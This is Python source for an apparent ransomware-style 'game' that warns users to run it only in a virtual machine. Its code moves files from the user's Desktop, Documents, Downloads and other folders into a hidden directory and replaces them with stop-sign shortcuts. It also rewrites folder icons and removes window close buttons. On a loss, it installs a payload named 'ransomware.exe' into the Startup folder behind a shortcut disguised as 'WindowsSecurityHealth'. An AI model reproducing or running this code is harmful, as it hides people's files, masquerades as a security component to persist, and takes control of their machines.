"""
It is HEAVILY recommended to run this program in a Virtual Machine, which
will prevent your REAL COMPUTER from getting affected.

Link to a good VM I know:
https://www.virtualbox.org/

You can also use others, just make sure its using Windows 10/11 as the
virtual OS.

Removable media: this program does NOT write to any removable drive.
It only enumerates removable media, records a fingerprint of each
drive it sees, and (on a loss) persists that fingerprint set so cd_1
can gate its trigger on it. No marker file, no UI, no clicks.
"""

global success_window
global punish
global _icons_applied
global lose_jumpscare_window
global ransom_flash_overlay
import sys
import os
import random
import subprocess
import hashlib
import ctypes
import win32com.client
import threading
import time
_icon_lock = threading.Lock()
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
from ctypes import wintypes as _wintypes
from ctypes import c_ulonglong as _c_ulonglong
from ctypes import c_wchar_p as _c_wchar_p
import shutil
import json
from PyQt5.QtWidgets import (QApplication, QWidget, QLabel, QGraphicsOpacityEffect,
                             QFrame, QHBoxLayout, QVBoxLayout)
from PyQt5.QtCore import (Qt, QObject, QTimer, QUrl, QPropertyAnimation,
                          QVariantAnimation, QEasingCurve, pyqtSignal)
from PyQt5.QtGui import QPixmap, QImage, QColor, QPainter, QPen
from PyQt5.QtMultimedia import QMediaPlayer, QMediaContent, QSoundEffect
from pynput import mouse, keyboard

ICON_FILE = 'stop_sign.ico'
_ICON_VERBOSE = False
BACKUP_FILENAME = 'icon_backup.json'
HIDDEN_FOLDER_NAME = 'hidden_originals'
HIDDEN_MANIFEST_SUFFIX = '.origin.json'
MAX_FILE_BYTES = 50 * 1024 * 1024
_icons_applied = False
_icon_backup = None

# ---------------------------------------------------------------------------
# Startup persistence (opt-in; only fires on lose_game)
# ---------------------------------------------------------------------------
STARTUP_PAYLOAD_FILENAME = 'ransomware.exe'          # <-- change me
STARTUP_LINK_NAME        = 'WindowsSecurityHealth.lnk'

# ---------------------------------------------------------------------------
# Drive snapshot
# ---------------------------------------------------------------------------
DRIVE_SNAPSHOT_FILENAME = 'drive_snapshot.json'

# ---------------------------------------------------------------------------
# Removable media (read-only)
# ---------------------------------------------------------------------------
DRIVE_TYPE_REMOVABLE  = 2
DRIVE_TYPE_CDROM      = 5
INDICATOR_DRIVE_TYPES = {DRIVE_TYPE_REMOVABLE, DRIVE_TYPE_CDROM}


# ---------------------------------------------------------------------------
# State directory helpers
# ---------------------------------------------------------------------------

def _persistent_icon_path():
    src = resource_path(ICON_FILE)
    if not getattr(sys, 'frozen', False):
        return src
    dst = os.path.join(_icons_state_dir(), ICON_FILE)
    try:
        if (not os.path.isfile(dst)
                or os.path.getmtime(dst) < os.path.getmtime(src)):
            shutil.copy2(src, dst)
    except Exception as e:
        print(f'[icons] could not stage icon: {e}')
        return src
    return dst


def _icons_state_dir():
    d = os.path.join(
        os.environ.get('LOCALAPPDATA', os.path.expanduser('~')),
        'RansomIconState'
    )
    os.makedirs(d, exist_ok=True)
    return d


def _icons_backup_path():
    return os.path.join(_icons_state_dir(), BACKUP_FILENAME)


def _icons_hidden_dir():
    d = os.path.join(_icons_state_dir(), HIDDEN_FOLDER_NAME)
    os.makedirs(d, exist_ok=True)
    return d


def _stable_id(path):
    return hashlib.sha1(path.lower().encode('utf-8')).hexdigest()[:16]


def _sidecar_path(hidden_path):
    return hidden_path + HIDDEN_MANIFEST_SUFFIX


def _write_sidecar(hidden_path, info):
    try:
        with open(_sidecar_path(hidden_path), 'w', encoding='utf-8') as f:
            json.dump(info, f, indent=2)
    except Exception as e:
        print(f'[backup] sidecar write failed for {hidden_path}: {e}')


def _read_sidecar(hidden_path):
    try:
        p = _sidecar_path(hidden_path)
        if os.path.exists(p):
            with open(p, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception:
        pass
    return None


def _remove_sidecar(hidden_path):
    try:
        p = _sidecar_path(hidden_path)
        if os.path.exists(p):
            os.remove(p)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Startup folder
# ---------------------------------------------------------------------------

def _startup_dir():
    appdata = os.environ.get('APPDATA')
    if not appdata:
        appdata = os.path.join(
            os.environ.get('USERPROFILE', os.path.expanduser('~')),
            'AppData', 'Roaming',
        )
    d = os.path.join(
        appdata,
        'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup',
    )
    os.makedirs(d, exist_ok=True)
    return d


def install_startup_payload():
    """Copy STARTUP_PAYLOAD_FILENAME into the user's Startup folder."""
    src = resource_path(STARTUP_PAYLOAD_FILENAME)
    if not os.path.isfile(src):
        print(f'[startup] payload not found: {src}')
        return None

    try:
        startup = _startup_dir()
    except Exception as e:
        print(f'[startup] cannot resolve Startup folder: {e}')
        return None

    payload_name = os.path.basename(src)
    dst = os.path.join(startup, payload_name)

    try:
        shutil.copy2(src, dst)
    except Exception as e:
        print(f'[startup] could not copy payload: {e}')
        return None

    try:
        shell = win32com.client.Dispatch('WScript.Shell')
        lnk_path = os.path.join(startup, STARTUP_LINK_NAME)
        sc = shell.CreateShortCut(lnk_path)
        sc.TargetPath = dst
        sc.WorkingDirectory = startup
        sc.WindowStyle = 7
        sc.Description = 'Security Health'
        sc.Save()
    except Exception as e:
        print(f'[startup] shortcut creation failed (payload still copied): {e}')

    try:
        _refresh_shell_icons([startup])
    except Exception:
        pass

    if _ICON_VERBOSE:
        print(f'[startup] installed payload at {dst}')
    return dst


# ---------------------------------------------------------------------------
# Removable media (read-only enumeration)
# ---------------------------------------------------------------------------

def _drive_type(root):
    try:
        return windll.kernel32.GetDriveTypeW(_c_wchar_p(root))
    except Exception:
        return 0


def enumerate_removable_drives():
    """Return [(root, type, free_bytes, total_bytes), ...].

    Pure detection. Never opens any file, never writes to any drive.
    """
    try:
        buf = ctypes.create_unicode_buffer(512)
        length = windll.kernel32.GetLogicalDriveStringsW(512, buf)
    except Exception as e:
        print(f'[media] enumeration failed: {e}')
        return []

    out = []
    for part in buf[:length].split('\x00'):
        if not part:
            continue
        t = _drive_type(part)
        if t not in INDICATOR_DRIVE_TYPES:
            continue
        free = _c_ulonglong(0)
        total = _c_ulonglong(0)
        try:
            ok = windll.kernel32.GetDiskFreeSpaceExW(
                _c_wchar_p(part), None, byref(total), byref(free)
            )
            if not ok:
                free = _c_ulonglong(0)
                total = _c_ulonglong(0)
        except Exception:
            free = _c_ulonglong(0)
            total = _c_ulonglong(0)
        out.append((part, t, free.value, total.value))
    return out


# ---------------------------------------------------------------------------
# Drive snapshot
# ---------------------------------------------------------------------------

def _snapshot_path():
    return os.path.join(_icons_state_dir(), DRIVE_SNAPSHOT_FILENAME)


def _drive_fingerprint(root):
    """Return a dict describing the mounted volume at `root`."""
    try:
        name_buf = ctypes.create_unicode_buffer(261)
        fs_buf   = ctypes.create_unicode_buffer(261)
        serial   = _wintypes.DWORD(0)
        maxlen   = _wintypes.DWORD(0)
        flags    = _wintypes.DWORD(0)
        ok = windll.kernel32.GetVolumeInformationW(
            _c_wchar_p(root), name_buf, 261,
            byref(serial), byref(maxlen), byref(flags),
            fs_buf, 261,
        )
        if not ok:
            return None
        total = _c_ulonglong(0)
        free  = _c_ulonglong(0)
        try:
            windll.kernel32.GetDiskFreeSpaceExW(
                _c_wchar_p(root), None, byref(total), byref(free)
            )
        except Exception:
            pass
        return {
            'root_at_snapshot': root,
            'serial': f'{serial.value:08X}',
            'label':  name_buf.value or '',
            'fs':     fs_buf.value or '',
            'total':  total.value,
        }
    except Exception:
        return None


def _fingerprint_key(fp):
    return f"{fp['serial']}|{fp['label']}|{fp['fs']}|{fp['total']}"


def write_drive_snapshot(fingerprints):
    """Persist a list of fingerprint dicts to the snapshot file."""
    entries = list(fingerprints)
    try:
        os.makedirs(os.path.dirname(_snapshot_path()), exist_ok=True)
        with open(_snapshot_path(), 'w', encoding='utf-8') as f:
            json.dump({'drives': entries}, f, indent=2)
        print(f'[snapshot] wrote {len(entries)} drive fingerprint(s)')
    except Exception as e:
        print(f'[snapshot] write failed: {e}')
    return entries


# ---------------------------------------------------------------------------
# Known folder resolution
# ---------------------------------------------------------------------------

def _known_folder(guid_tuple):
    import ctypes
    from ctypes import wintypes

    try:
        class GUID(ctypes.Structure):
            _fields_ = [
                ('Data1', wintypes.DWORD),
                ('Data2', wintypes.WORD),
                ('Data3', wintypes.WORD),
                ('Data4', ctypes.c_ubyte * 8),
            ]

        d1, d2, d3, d4 = guid_tuple
        guid = GUID(d1, d2, d3, (ctypes.c_ubyte * 8)(*d4))

        path_ptr = ctypes.c_wchar_p()
        result = ctypes.windll.shell32.SHGetKnownFolderPath(
            ctypes.byref(guid), 0, None, ctypes.byref(path_ptr)
        )
        if result == 0 and path_ptr.value:
            path = path_ptr.value
            ctypes.windll.ole32.CoTaskMemFree(path_ptr)
            return path
    except Exception:
        pass
    return None


_KNOWN_FOLDERS = {
    'Desktop':   (0xB4BFCC3A, 0xDB2C, 0x424C,
                  (0xB0, 0x29, 0x7F, 0xE9, 0x9A, 0x87, 0xC6, 0x41)),
    'Downloads': (0x374DE290, 0x123F, 0x4565,
                  (0x91, 0x64, 0x39, 0xC4, 0x92, 0x5B, 0x5B, 0xE6)),
    'Documents': (0xFDD39AD0, 0x238F, 0x46AF,
                  (0xAD, 0xB4, 0x6C, 0x85, 0x48, 0x03, 0x69, 0xC7)),
    'Pictures':  (0x33E28130, 0x4E1E, 0x4676,
                  (0x83, 0x5A, 0x98, 0x39, 0x5C, 0x3B, 0xC3, 0xBB)),
    'Videos':    (0x18989B1D, 0x99B5, 0x455B,
                  (0x84, 0x1C, 0xAB, 0x7C, 0x74, 0xE4, 0xDD, 0xFC)),
    'Music':     (0x4BD8D571, 0x6D19, 0x48D3,
                  (0xBE, 0x97, 0x42, 0x22, 0x20, 0x08, 0x0E, 0x43)),
}


def _known_folder_desktop():
    return _known_folder(_KNOWN_FOLDERS['Desktop'])


def _is_writable_dir(path):
    try:
        probe = os.path.join(path, f'.__probe_{os.getpid()}')
        with open(probe, 'w') as f:
            f.write('x')
        os.remove(probe)
        return True
    except Exception:
        return False


_desktop_folders_cache = None


def _desktop_folders():
    global _desktop_folders_cache
    if _desktop_folders_cache is not None:
        return _desktop_folders_cache

    candidates = []

    for label, guid in _KNOWN_FOLDERS.items():
        real = _known_folder(guid)
        if real and os.path.isdir(real) and real not in candidates:
            candidates.append(real)

    public = os.path.join(
        os.environ.get('PUBLIC', r'C:\Users\Public'), 'Desktop'
    )
    if os.path.isdir(public) and public not in candidates:
        candidates.append(public)

    home = os.environ.get('USERPROFILE', os.path.expanduser('~'))
    for name in ('Desktop', 'Downloads', 'Documents',
                 'Pictures', 'Videos', 'Music'):
        naive = os.path.join(home, name)
        if os.path.isdir(naive) and naive not in candidates:
            candidates.append(naive)

    folders = [p for p in candidates if _is_writable_dir(p)]
    skipped = [p for p in candidates if p not in folders]

    if _ICON_VERBOSE:
        print(f'[icons] Writable folders: {folders}')
        if skipped:
            print(f'[icons] Skipping (no write access): {skipped}')

    _desktop_folders_cache = folders
    return folders


def _invalidate_desktop_folders_cache():
    global _desktop_folders_cache
    _desktop_folders_cache = None


# ---------------------------------------------------------------------------
# Attribute / shell-notify helpers
# ---------------------------------------------------------------------------

_FILE_ATTRIBUTE_READONLY = 0x01
_FILE_ATTRIBUTE_HIDDEN   = 0x02
_FILE_ATTRIBUTE_SYSTEM   = 0x04


def _set_attr(path, mask, on):
    attrs = windll.kernel32.GetFileAttributesW(str(path))
    if attrs == -1:
        return
    new = (attrs | mask) if on else (attrs & ~mask)
    windll.kernel32.SetFileAttributesW(str(path), new)


def _shchange_notify():
    try:
        SHCNE_ASSOCCHANGED = 0x08000000
        SHCNF_IDLIST       = 0x0000
        SHCNF_FLUSH        = 0x1000
        windll.shell32.SHChangeNotify(
            SHCNE_ASSOCCHANGED,
            SHCNF_IDLIST | SHCNF_FLUSH,
            None, None
        )
    except Exception as e:
        print(f'[shell] SHChangeNotify failed: {e}')


def _refresh_shell_icons(changed_folders=None):
    _shchange_notify()
    if not changed_folders:
        return
    try:
        SHCNE_UPDATEDIR = 0x00001000
        SHCNF_PATHW = 0x0005
        for path in changed_folders:
            windll.shell32.SHChangeNotify(
                SHCNE_UPDATEDIR, SHCNF_PATHW, str(path), None
            )
    except Exception as e:
        print(f'[shell] UPDATEDIR failed: {e}')


# ---------------------------------------------------------------------------
# Aero / DWM title bar helpers
# ---------------------------------------------------------------------------

def _make_aero_window(widget, dark=True):
    """Apply a native Aero-style title bar to a top-level widget.

    - Sets the DWM dark-mode attribute so the frame matches the dark
      content.
    - Strips WS_SYSMENU / WS_MINIMIZEBOX / WS_MAXIMIZEBOX so only a
      plain title bar (title text + drag) remains. No close, no
      minimize, no maximize, no system menu.

    Safe to call more than once. No-op on non-Windows platforms.
    """
    if not sys.platform.startswith('win'):
        return
    try:
        hwnd = int(widget.winId())
    except Exception:
        return
    if not hwnd:
        return

    # 1) Dark title bar (Windows 10 1809+ = attr 20, older = attr 19)
    try:
        dwm = ctypes.windll.dwmapi
        value = ctypes.c_int(1 if dark else 0)
        for attr in (20, 19):
            try:
                if dwm.DwmSetWindowAttribute(
                    hwnd, attr,
                    ctypes.byref(value), ctypes.sizeof(value)
                ) == 0:
                    break
            except Exception:
                continue
    except Exception:
        pass

    # 2) Strip close / min / max / system menu from the Win32 style
    try:
        user32 = ctypes.windll.user32
        GWL_STYLE      = -16
        WS_SYSMENU     = 0x00080000
        WS_MINIMIZEBOX = 0x00020000
        WS_MAXIMIZEBOX = 0x00010000

        style = user32.GetWindowLongW(hwnd, GWL_STYLE)
        new_style = style & ~(WS_SYSMENU | WS_MINIMIZEBOX | WS_MAXIMIZEBOX)
        if new_style != style:
            user32.SetWindowLongW(hwnd, GWL_STYLE, new_style)

            SWP_NOSIZE       = 0x0001
            SWP_NOMOVE       = 0x0002
            SWP_NOZORDER     = 0x0004
            SWP_FRAMECHANGED = 0x0020
            user32.SetWindowPos(
                hwnd, 0, 0, 0, 0, 0,
                SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_FRAMECHANGED
            )
    except Exception as e:
        print(f'[aero] strip buttons failed: {e}')


# ---------------------------------------------------------------------------
# Canonical folder-icon API
# ---------------------------------------------------------------------------

import ctypes as _ctypes
from ctypes import Structure as _Structure
from ctypes import c_void_p as _c_void_p
from ctypes import c_int as _c_int


class _SHFOLDERCUSTOMSETTINGS(_Structure):
    _fields_ = [
        ('dwSize', _wintypes.DWORD),
        ('dwMask', _wintypes.DWORD),
        ('pvid', _c_void_p),
        ('pszWebViewTemplate', _c_wchar_p),
        ('cchWebViewTemplate', _wintypes.DWORD),
        ('pszWebViewTemplateVersion', _c_wchar_p),
        ('pszInfoTip', _c_wchar_p),
        ('cchInfoTip', _wintypes.DWORD),
        ('pclsid', _c_void_p),
        ('cchCLSID', _wintypes.DWORD),
        ('dwFlags', _wintypes.DWORD),
        ('pszIconFile', _c_wchar_p),
        ('cchIconFile', _wintypes.DWORD),
        ('iIconIndex', _c_int),
        ('pszLogo', _c_wchar_p),
        ('cchLogo', _wintypes.DWORD),
    ]


_FCSM_ICONFILE = 0x00000010
_FCS_FORCEWRITE = 0x00000002


def _set_folder_icon(folder, icon_path, icon_index=0):
    try:
        fcs = _SHFOLDERCUSTOMSETTINGS()
        fcs.dwSize = _ctypes.sizeof(_SHFOLDERCUSTOMSETTINGS)
        fcs.dwMask = _FCSM_ICONFILE
        fcs.pszIconFile = icon_path
        fcs.cchIconFile = 0
        fcs.iIconIndex = icon_index
        res = _ctypes.windll.shell32.SHGetSetFolderCustomSettings(
            _ctypes.byref(fcs), str(folder), _FCS_FORCEWRITE
        )
        return res == 0
    except Exception as e:
        print(f'[icons] SHGetSetFolderCustomSettings failed on {folder}: {e}')
        return False


def _clear_folder_icon(folder):
    try:
        fcs = _SHFOLDERCUSTOMSETTINGS()
        fcs.dwSize = _ctypes.sizeof(_SHFOLDERCUSTOMSETTINGS)
        fcs.dwMask = _FCSM_ICONFILE
        fcs.pszIconFile = None
        fcs.iIconIndex = 0
        res = _ctypes.windll.shell32.SHGetSetFolderCustomSettings(
            _ctypes.byref(fcs), str(folder), _FCS_FORCEWRITE
        )
        return res == 0
    except Exception:
        return False


# ---------------------------------------------------------------------------
# Backup load / save
# ---------------------------------------------------------------------------

def _load_icon_backup():
    p = _icons_backup_path()
    if not os.path.exists(p):
        return {}
    try:
        with open(p, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return {}


def _save_icon_backup(backup):
    try:
        with open(_icons_backup_path(), 'w', encoding='utf-8') as f:
            json.dump(backup, f, indent=2)
    except Exception as e:
        print(f'[backup] save failed: {e}')


# ---------------------------------------------------------------------------
# Hijack detection
# ---------------------------------------------------------------------------

def _icons_are_hijacked(ico, backup):
    if not backup:
        return False
    ico_name = os.path.basename(ico).lower()
    shell = win32com.client.Dispatch('WScript.Shell')

    for key in backup:
        if not key.startswith('lnk::'):
            continue
        path = key[5:]
        if not os.path.exists(path):
            continue
        try:
            sc = shell.CreateShortCut(path)
            if ico_name in (sc.IconLocation or '').lower():
                return True
        except Exception:
            pass

    for key in backup:
        if not key.startswith('file::'):
            continue
        info = backup[key]
        if (os.path.exists(info['hidden_path'])
                and os.path.exists(info['lnk_path'])):
            return True

    return False


# ---------------------------------------------------------------------------
# Backup builder
# ---------------------------------------------------------------------------

def _backup_is_fresh(max_age_seconds=3600):
    p = _icons_backup_path()
    if not os.path.exists(p):
        return False
    try:
        return (time.time() - os.path.getmtime(p)) < max_age_seconds
    except Exception:
        return False


def build_icon_backup(ico):
    existing = _load_icon_backup()
    if existing and _icons_are_hijacked(ico, existing) and _backup_is_fresh():
        return existing
    if existing and _icons_are_hijacked(ico, existing):
        if _ICON_VERBOSE:
            print('[backup] live hijack detected, reusing existing backup.')
        return existing
    if existing:
        if _ICON_VERBOSE:
            print('[backup] stale backup (icons not hijacked), re-snapshotting.')
        try:
            os.remove(_icons_backup_path())
        except Exception:
            pass

    backup = {}
    hidden_dir = _icons_hidden_dir()
    shell = win32com.client.Dispatch('WScript.Shell')

    for folder in _desktop_folders():
        try:
            names = os.listdir(folder)
        except Exception:
            continue

        for name in names:
            if name.lower() == 'desktop.ini':
                continue

            full = os.path.join(folder, name)

            if os.path.isdir(full):
                try:
                    attrs = windll.kernel32.GetFileAttributesW(str(full))
                    if attrs != -1 and (attrs & 0x400):
                        continue
                except Exception:
                    pass

            low = name.lower()

            try:
                if low.endswith('.lnk'):
                    sc = shell.CreateShortCut(full)
                    backup[f'lnk::{full}'] = sc.IconLocation or ''

                elif low.endswith('.url'):
                    with open(full, 'r', encoding='utf-8',
                              errors='ignore') as f:
                        backup[f'url::{full}'] = f.read()

                elif os.path.isdir(full):
                    ini = os.path.join(full, 'desktop.ini')
                    entry = {'had_ini': os.path.exists(ini),
                             'had_system': False}
                    if entry['had_ini']:
                        try:
                            with open(ini, 'r', encoding='utf-8',
                                      errors='ignore') as f:
                                entry['content'] = f.read()
                        except Exception:
                            entry['content'] = ''
                        try:
                            attrs = windll.kernel32.GetFileAttributesW(str(ini))
                            entry['had_system'] = (
                                attrs != -1 and bool(attrs & 0x04)
                            )
                        except Exception:
                            pass
                    backup[f'dir::{full}'] = entry

                else:
                    try:
                        if os.path.getsize(full) > MAX_FILE_BYTES:
                            if _ICON_VERBOSE:
                                print(f'[backup] skipping large file: {full}')
                            continue
                    except Exception:
                        continue

                    sid = _stable_id(full)
                    hidden_path = os.path.join(hidden_dir, f'{sid}_{name}')
                    n = 0
                    while os.path.exists(hidden_path) and n < 5:
                        n += 1
                        hidden_path = os.path.join(
                            hidden_dir, f'{sid}_{n}_{name}'
                        )

                    lnk_path = full + '.lnk'
                    backup[f'file::{lnk_path}'] = {
                        'lnk_path': lnk_path,
                        'hidden_path': hidden_path,
                        'original_name': name,
                        'original_dir': folder,
                    }

            except Exception as e:
                print(f'[backup] skipped {full}: {e}')

    _save_icon_backup(backup)
    if _ICON_VERBOSE:
        print(f'[backup] recorded {len(backup)} entries.')
    return backup


# ---------------------------------------------------------------------------
# Apply
# ---------------------------------------------------------------------------

def apply_desktop_icons():
    with _icon_lock:
        _apply_desktop_icons_unlocked()


def _apply_desktop_icons_unlocked():
    global _icons_applied
    changed_dirs = []

    ico = _persistent_icon_path()
    if not os.path.isfile(ico):
        print(f'ERROR: icon file not found: {ico}')
        return
    ico = os.path.abspath(ico)
    icon_ref = f'{ico},0'

    global _icon_backup
    backup = _icon_backup or build_icon_backup(ico)
    if not backup:
        print('[apply] nothing to do.')
        return

    shell = win32com.client.Dispatch('WScript.Shell')

    for key, value in backup.items():
        try:
            if key.startswith('lnk::'):
                lnk = key[5:]
                if os.path.exists(lnk):
                    sc = shell.CreateShortCut(lnk)
                    sc.IconLocation = icon_ref
                    sc.Save()

            elif key.startswith('url::'):
                url = key[5:]
                if os.path.exists(url):
                    with open(url, 'r', encoding='utf-8',
                              errors='ignore') as f:
                        original = f.read()
                    lines = [
                        ln for ln in original.splitlines()
                        if not ln.strip().lower().startswith(
                            ('iconfile=', 'iconindex=')
                        )
                    ]
                    lines.append(f'IconFile={ico}')
                    lines.append('IconIndex=0')
                    with open(url, 'w', encoding='utf-8') as f:
                        f.write('\n'.join(lines) + '\n')

            elif key.startswith('dir::'):
                folder = key[5:]
                if not os.path.isdir(folder):
                    continue

                _set_attr(folder, _FILE_ATTRIBUTE_READONLY, False)

                if _set_folder_icon(folder, ico, 0):
                    changed_dirs.append(folder)
                else:
                    ini = os.path.join(folder, 'desktop.ini')
                    if os.path.exists(ini):
                        _set_attr(ini, _FILE_ATTRIBUTE_READONLY, False)
                        _set_attr(ini, _FILE_ATTRIBUTE_HIDDEN, False)
                        _set_attr(ini, _FILE_ATTRIBUTE_SYSTEM, False)
                        try:
                            os.remove(ini)
                        except Exception as e:
                            print(f'[apply] cannot remove old {ini}: {e}')
                            continue
                    try:
                        with open(ini, 'w', encoding='utf-8') as f:
                            f.write('[.ShellClassInfo]\n')
                            f.write(f'IconResource={icon_ref}\n')
                        _set_attr(ini, _FILE_ATTRIBUTE_HIDDEN, True)
                        _set_attr(ini, _FILE_ATTRIBUTE_READONLY, True)
                        _set_attr(ini, _FILE_ATTRIBUTE_SYSTEM, True)
                        _set_attr(folder, _FILE_ATTRIBUTE_READONLY, True)
                        changed_dirs.append(folder)
                    except Exception as e:
                        print(f'[apply] cannot write {ini}: {e}')

            elif key.startswith('file::'):
                info = value
                original_path = os.path.join(
                    info.get('original_dir',
                             os.path.dirname(info['lnk_path'])),
                    info['original_name']
                )
                hidden_path = info['hidden_path']
                lnk_path = info['lnk_path']

                if os.path.exists(original_path) and not os.path.exists(hidden_path):
                    os.makedirs(os.path.dirname(hidden_path), exist_ok=True)
                    _write_sidecar(hidden_path, {
                        'original_dir': info.get(
                            'original_dir',
                            os.path.dirname(lnk_path)
                        ),
                        'original_name': info['original_name'],
                        'hidden_path': hidden_path,
                        'lnk_path': lnk_path,
                    })
                    shutil.move(original_path, hidden_path)
                    sc = shell.CreateShortCut(lnk_path)
                    sc.TargetPath = hidden_path
                    sc.WorkingDirectory = os.path.dirname(lnk_path)
                    sc.IconLocation = icon_ref
                    sc.Save()

                elif os.path.exists(hidden_path) and not os.path.exists(lnk_path):
                    if not os.path.exists(_sidecar_path(hidden_path)):
                        _write_sidecar(hidden_path, {
                            'original_dir': info.get(
                                'original_dir',
                                os.path.dirname(lnk_path)
                            ),
                            'original_name': info['original_name'],
                            'hidden_path': hidden_path,
                            'lnk_path': lnk_path,
                        })
                    sc = shell.CreateShortCut(lnk_path)
                    sc.TargetPath = hidden_path
                    sc.WorkingDirectory = os.path.dirname(lnk_path)
                    sc.IconLocation = icon_ref
                    sc.Save()

                elif os.path.exists(lnk_path):
                    sc = shell.CreateShortCut(lnk_path)
                    if sc.IconLocation != icon_ref:
                        sc.IconLocation = icon_ref
                        sc.Save()

        except Exception as e:
            print(f'[apply] failed on {key}: {e}')

    _refresh_shell_icons(changed_dirs)
    _icons_applied = True
    if _ICON_VERBOSE:
        print('Desktop icons changed.')


# ---------------------------------------------------------------------------
# Restore
# ---------------------------------------------------------------------------

def restore_desktop_icons():
    with _icon_lock:
        _restore_desktop_icons_unlocked()


def _restore_desktop_icons_unlocked():
    global _icons_applied

    backup = _load_icon_backup()
    if not backup:
        return

    shell = win32com.client.Dispatch('WScript.Shell')
    remaining = dict(backup)
    changed_dirs = []

    keys = sorted(
        backup.keys(),
        key=lambda k: 0 if k.startswith('file::') else 1
    )

    for key in keys:
        value = backup[key]
        try:
            if key.startswith('file::'):
                info = value
                lnk_path = info['lnk_path']
                hidden_path = info['hidden_path']

                if os.path.exists(lnk_path):
                    _set_attr(lnk_path, _FILE_ATTRIBUTE_READONLY, False)
                    try:
                        os.remove(lnk_path)
                    except Exception as e:
                        print(f'[restore] cannot remove {lnk_path}: {e}')
                        continue

                if os.path.exists(hidden_path):
                    target = os.path.join(
                        info.get('original_dir',
                                 os.path.dirname(lnk_path)),
                        info['original_name']
                    )
                    if os.path.exists(target) and target != hidden_path:
                        print(f'[restore] target occupied, leaving hidden '
                              f'file at {hidden_path}')
                    else:
                        shutil.move(hidden_path, target)
                        _remove_sidecar(hidden_path)
                else:
                    _remove_sidecar(hidden_path)

                remaining.pop(key, None)

            elif key.startswith('lnk::'):
                lnk = key[5:]
                if os.path.exists(lnk):
                    sc = shell.CreateShortCut(lnk)
                    sc.IconLocation = value
                    sc.Save()
                remaining.pop(key, None)

            elif key.startswith('url::'):
                url = key[5:]
                if os.path.exists(url):
                    _set_attr(url, _FILE_ATTRIBUTE_READONLY, False)
                    with open(url, 'w', encoding='utf-8') as f:
                        f.write(value)
                remaining.pop(key, None)

            elif key.startswith('dir::'):
                folder = key[5:]
                if os.path.isdir(folder):
                    _set_attr(folder, _FILE_ATTRIBUTE_READONLY, False)

                entry = value if isinstance(value, dict) else {
                    'had_ini': False, 'content': ''
                }

                if entry.get('had_ini'):
                    ini = os.path.join(folder, 'desktop.ini')
                    if os.path.exists(ini):
                        _set_attr(ini, _FILE_ATTRIBUTE_READONLY, False)
                        _set_attr(ini, _FILE_ATTRIBUTE_HIDDEN, False)
                        _set_attr(ini, _FILE_ATTRIBUTE_SYSTEM, False)
                        try:
                            os.remove(ini)
                        except Exception as e:
                            print(f'[restore] cannot remove {ini}: {e}')
                    try:
                        with open(ini, 'w', encoding='utf-8') as f:
                            f.write(entry.get('content', ''))
                        _set_attr(ini, _FILE_ATTRIBUTE_HIDDEN, True)
                        _set_attr(ini, _FILE_ATTRIBUTE_READONLY, True)
                        if entry.get('had_system'):
                            _set_attr(ini, _FILE_ATTRIBUTE_SYSTEM, True)
                    except Exception as e:
                        print(f'[restore] could not restore {ini}: {e}')
                else:
                    _clear_folder_icon(folder)
                    ini = os.path.join(folder, 'desktop.ini')
                    if os.path.exists(ini):
                        _set_attr(ini, _FILE_ATTRIBUTE_READONLY, False)
                        _set_attr(ini, _FILE_ATTRIBUTE_HIDDEN, False)
                        _set_attr(ini, _FILE_ATTRIBUTE_SYSTEM, False)
                        try:
                            os.remove(ini)
                        except Exception:
                            pass

                changed_dirs.append(folder)
                remaining.pop(key, None)

        except Exception as e:
            print(f'[restore] failed on {key}: {e}')

    _save_icon_backup(remaining)

    if not remaining:
        try:
            os.remove(_icons_backup_path())
        except Exception:
            pass
        hd = _icons_hidden_dir()
        try:
            if os.path.isdir(hd) and not os.listdir(hd):
                os.rmdir(hd)
        except Exception:
            pass
    else:
        print(f'[restore] WARNING: {len(remaining)} entries not restored:')
        for k in remaining:
            print(f'  - {k}')

    _refresh_shell_icons(changed_dirs)
    _icons_applied = False
    if _ICON_VERBOSE:
        print('Desktop icons restored.')


def _apply_icons_background():
    try:
        import pythoncom
        pythoncom.CoInitialize()
    except Exception:
        pass
    try:
        apply_desktop_icons()
    except Exception as e:
        print(f'[bg] icon apply failed: {e}')
    finally:
        try:
            import pythoncom
            pythoncom.CoUninitialize()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Game constants
# ---------------------------------------------------------------------------

TRIGGER_COOLDOWN = 5
RANSOM_TIME = 78
RANSOM_GOLD = 500
GLITCH_IMAGES = ['glitch1.png', 'glitch2.jpg', 'glitch3.jpg', 'glitch4.jpg', 'glitch5.jpg', 'glitch6.jpg', 'glitch7.jpg', 'stop_sign.png', 'glitch6.jpg', 'stop_sign.png', 'stop_sign.png', 'stop_sign.png', 'stop_sign.png']

# These glitch images spawn as regular framed windows instead of the
# frameless, click-through glitch windows. Matched by base name so the
# extension (.png / .jpg) doesn't matter.
REGULAR_WINDOW_GLITCHES = {'glitch2', 'glitch3', 'glitch4','glitch5'}


def _is_regular_glitch(path):
    base = os.path.splitext(os.path.basename(path))[0].lower()
    return base in REGULAR_WINDOW_GLITCHES


GLITCH_BLINK_INTERVAL_MS = 1200
GLITCH_SPAWN_CHANCE = 0.25
GLITCH_DESPAWN_CHANCE = 0.25

# --- Drawer tuning ---------------------------------------------------------
DRAWER_W = 300
SLOT_COUNT = 3
SLOT_HEIGHT_CLOSED = 44
SLOT_HEIGHT_OPEN = 110
SLOT_ANIM_MS = 200
SLOT_ANIM_EASE = QEasingCurve.OutCubic
DRAWER_ICON_SIZE = 56

# Timing
DRAWER_FIRST_SPAWN_DELAY_MS = 1500
DRAWER_TIMEOUT_MS = 12000
DRAWER_LINGER_MS = 3000
DRAWER_SPAWN_DELAY_MS = 800

# Reward per coin
DRAWER_COIN_VALUE = 50

# Roll odds
DRAWER_ROLL_TABLE = [
    ('COIN',    0.50),
    ('NOTHING', 0.30),
    ('TRAP',    0.20),
]

# --- "Ransom tries to fake Windows 95" red dialog palette ---------------
DRAWER_FONT              = '"MS Sans Serif", "Tahoma", "Segoe UI", sans-serif'
DRAWER_FONT_SMALL        = '"MS Sans Serif", "Tahoma", "Segoe UI", sans-serif'

